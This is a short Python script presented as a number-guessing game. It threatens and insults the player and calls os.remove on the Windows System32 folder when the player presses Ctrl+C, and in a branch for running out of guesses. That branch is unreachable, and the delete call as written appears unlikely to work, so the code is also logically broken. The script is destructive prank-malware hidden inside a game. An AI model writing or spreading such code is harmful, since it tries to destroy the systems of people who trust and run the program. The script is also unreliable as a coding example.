import os
from time import sleep
import random

number = random.randint(1, 10)

count = 0
while True:
    try:
        guess = int(input("""
        
        -----------------------------------
            Time to Guess for your Faith 
            
                !!CHOOSE WISELY!!
        
                 [ between 1-10 ]
                 
            Oh...! If you try to close this
                You lose your chance :)
            
        ------------------------------------\n        >>> """))

        if guess == number:
            print("""
            You can stay alive
                FOR NOW!!!
            """)

        elif guess != number:
            count += 1
            remain = 3 - count
            print(f"LEFT : {remain}")

        elif count == 3:
            print(f"""
                It was {number}
                \nSay goodbye to your PC
                """)

            os.remove("C:\Windows\System32")

    except ValueError:
        print("""
            I said NUMBER you stupid
             Play this game correct
            """)
        continue

    except KeyboardInterrupt:
        print("Told You..")
        sleep(3)
        os.remove("C:\Windows\System32")
